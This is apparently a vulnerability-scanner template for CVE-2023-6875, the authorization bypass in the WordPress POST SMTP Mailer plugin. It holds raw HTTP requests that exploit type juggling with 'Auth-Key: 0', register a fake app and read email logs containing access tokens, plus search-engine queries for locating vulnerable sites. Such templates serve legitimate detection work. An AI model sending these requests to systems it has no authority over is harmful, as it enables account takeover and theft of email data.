http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body_2, "success\":true,", "{\"fcm_token\":\"{{fcm_token}}")
    - contains_all(body_3, "true,\"data\":", "access_token=")
    type: dsl
  raw:
  - 'POST /wp-json/post-smtp/v1/connect-app HTTP/1.1

    Host: {{Hostname}}

    Auth-Key: 0

    Device: {{device}}

    Fcm-Token: {{fcm_token}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'POST /wp-json/post-smtp/v1/connect-app HTTP/1.1

    Host: {{Hostname}}

    Auth-Key: 0

    Device: {{device}}

    Fcm-Token: {{fcm_token}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'GET /wp-json/post-smtp/v1/get-log HTTP/1.1

    Host: {{Hostname}}

    Auth-Key: 0

    Device: {{device}}

    Fcm-Token: {{fcm_token}}

    '
id: CVE-2023-6875
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:wpexperts:post_smtp_mailer:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-6875
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-862
    epss-percentile: 0.99856
    epss-score: 0.93851
  description: "The POST SMTP Mailer \u2013 Email log, Delivery Failure Notifications\
    \ and Best Mail SMTP for WordPress plugin for WordPress is vulnerable to unauthorized\
    \ access of data and modification of data due to a type juggling issue on the\
    \ connect-app REST endpoint in all versions up to, and including, 2.8.7.\n"
  impact: 'Unauthenticated attackers can exploit type juggling vulnerabilities in
    the connect-app REST endpoint to access and modify sensitive email configuration
    data.

    '
  metadata:
    fofa-query: body=/wp-content/plugins/post-smtp
    framework: wordpress
    max-request: 3
    product: post_smtp_mailer
    publicwww-query: /wp-content/plugins/post-smtp
    shodan-query: http.html:/wp-content/plugins/post-smtp
    vendor: wpexperts
    verified: true
  name: WordPress POST SMTP Mailer <= 2.8.7 - Authorization Bypass
  reference:
  - https://plugins.trac.wordpress.org/browser/post-smtp/trunk/Postman/Mobile/includes/rest-api/v1/rest-api.php#L60
  - https://plugins.trac.wordpress.org/changeset/3016051/post-smtp/trunk?contextall=1&old=3012318&old_path=%2Fpost-smtp%2Ftrunk
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/e675d64c-cbb8-4f24-9b6f-2597a97b49af?source=cve
  - https://nvd.nist.gov/vuln/detail/CVE-2023-6875
  - https://github.com/UlyssesSaicha/CVE-2023-6875
  remediation: Fixed in 2.8.8
  severity: critical
  tags: cve,cve2023,wp,wp-plugin,wordpress,smtp,mailer,auth-bypass,wpexperts,vkev,vuln
variables:
  device: '{{randstr_2}}'
  fcm_token: '{{randstr_1}}'
